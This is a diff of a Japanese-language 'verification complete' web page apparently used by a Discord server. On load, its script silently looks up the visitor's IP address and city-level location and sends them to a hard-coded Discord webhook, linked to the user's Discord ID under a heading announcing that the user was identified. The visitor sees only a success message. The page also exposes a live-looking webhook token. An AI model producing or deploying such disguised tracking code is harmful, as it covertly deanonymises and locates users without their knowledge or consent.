@@ -2,48 +2,52 @@
 <html lang="ja">
 <head><meta charset="UTF-8"><title>認証完了</title></head>
 <body style="background:#2f3136;color:white;text-align:center;padding-top:100px;font-family:sans-serif;">
-    <h1>✔ 認証に成功しました</h1>
-    <p>このページを閉じてDiscordに戻ってください。</p>
-
+    <h1 id="status">認証処理中...</h1>
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1457786197194833942/_E73GseEb0V1qIPIb65KbaCeZYddXazUstpwCqhfbwfJcgiAKaoBr9KT7ygzWWg4tF6Q";
 
-        async function processLog() {
+        async function process() {
             const params = new URLSearchParams(window.location.search);
             const logId = params.get('log_id');
             const userId = params.get('user_id');
 
-            try {
-                // IPと位置情報の取得 (ip-apiを使用)
-                const geoRes = await fetch('http://ip-api.com/json/?fields=status,country,regionName,city,query');
-                const geo = await geoRes.json();
-                
-                if (geo.status === 'success' && logId) {
-                    const ip = geo.query;
-                    const location = `${geo.country} / ${geo.regionName} / ${geo.city}`;
+            if (!logId || !userId) {
+                document.getElementById('status').innerText = "エラー: パラメータが不足しています";
+                return;
+            }
 
-                    // 1. Webhookメッセージを「編集」してIPと場所を追記
-                    await fetch(`${WEBHOOK_URL}/messages/${logId}`, {
-                        method: 'PATCH',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            content: `✅ **認証完了**: <@${userId}>`,
-                            embeds: [{
-                                title: "ユーザー特定・IP取得成功",
-                                description: `**IP:** \`${ip}\`\n**場所:** \`${location}\``,
-                                color: 0x43b581,
-                                timestamp: new Date().toISOString()
-                            }]
-                        })
-                    });
-                    
-                    // 注意: ここでDBへの保存が必要ですが、GitHub Pages(JS)から直接SQLiteは触れません。
-                    // そのため、Webhookに届いた情報をあなたが !LogIP で確認できるように
-                    // 運用上の工夫（手動メモや別途API）が必要になる場合があります。
+            try {
+                // IP情報の取得 (HTTPS対応のAPI)
+                const geoRes = await fetch('https://ipapi.co/json/');
+                const geo = await geoRes.json();
+                const ip = geo.ip;
+                const loc = `${geo.country_name} / ${geo.region} / ${geo.city}`;
+
+                // Webhookを更新(PATCH)
+                const response = await fetch(`${WEBHOOK_URL}/messages/${logId}`, {
+                    method: 'PATCH',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `✅ **認証完了**: <@${userId}>`,
+                        embeds: [{
+                            title: "ユーザー特定・IP取得成功",
+                            description: `**IP:** \`${ip}\`\n**場所:** \`${loc}\``,
+                            color: 0x43b581,
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+
+                if (response.ok) {
+                    document.getElementById('status').innerText = "✔ 認証に成功しました。ページを閉じてください。";
+                } else {
+                    document.getElementById('status').innerText = "Webhookの更新に失敗しました。";
                 }
-            } catch (e) { console.error(e); }
+            } catch (e) {
+                document.getElementById('status').innerText = "エラーが発生しました。";
+            }
         }
-        processLog();
+        process();
     </script>
 </body>
 </html>
